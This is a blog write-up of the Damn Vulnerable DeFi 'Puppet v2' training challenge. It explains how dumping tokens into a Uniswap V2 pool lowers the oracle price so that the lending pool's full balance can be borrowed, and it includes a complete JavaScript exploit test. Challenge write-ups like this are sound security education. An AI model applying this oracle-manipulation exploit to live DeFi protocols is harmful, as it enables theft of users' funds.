---
layout: post
title: Damn Vulnerable DeFi - Puppet v2
---

## Description
The developers of the [last lending](https://www.damnvulnerabledefi.xyz/challenges/8.html) pool are saying that they've learned the lesson. And just released a new version!

Now they're using a [Uniswap v2 exchange](https://docs.uniswap.org/protocol/V2/introduction) as a price oracle, along with the recommended utility libraries. That should be enough.

You start with 20 ETH and 10000 DVT tokens in balance. The new lending pool has a million DVT tokens in balance. You know what to do ;)

## Solution
Just like the previous challenge, I had a lot of fun diving into the Unisawp contracts to solve this. Again, the pool uses Uniswap as its oracle. And again, we're going to manipulate the pricing
on uniswap to reduce the collateral required to borrow from the pool. With Uniswap V2 it's a bit
more roundabout, but the main idea is the same.

I found a handy function on the Uniswap V2 router, [swapExactTokensForETH](https://docs.uniswap.org/protocol/V2/reference/smart-contracts/router-02#swapexacttokensforeth). This is basically like `tokenToEthSwapInput` on the v1 contract. It allows us to exchange our tokens for ETH.

As the attacker, we can dump all our tokens for ETH using _swapExactTokensForETH_. This will drive down the exchange's oracle price:

```
UniswapV2Library.quote(amount.mul(10 ** 18), reservesToken, reservesWETH);
```

Then we can borrow the lending pool's entire balance. This exploit is pure Javascript:

```
it('Exploit', async function () {
    /** CODE YOUR EXPLOIT HERE */
    await this.token.connect(attacker).approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE)
    await this.uniswapRouter.connect(attacker).swapExactTokensForETH(
        ATTACKER_INITIAL_TOKEN_BALANCE,
        10000,
        [
            this.token.address,
            this.weth.address,
        ],
        attacker.address,
        (await ethers.provider.getBlock('latest')).timestamp * 2
    )

    const attackerEthBalance = await ethers.provider.getBalance(attacker.address)
    await this.weth.connect(attacker).deposit({value: attackerEthBalance.sub(ethers.utils.parseEther("0.1"))})
    await this.weth.connect(attacker).approve(this.lendingPool.address, await this.weth.balanceOf(attacker.address))

    await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE)
});
```
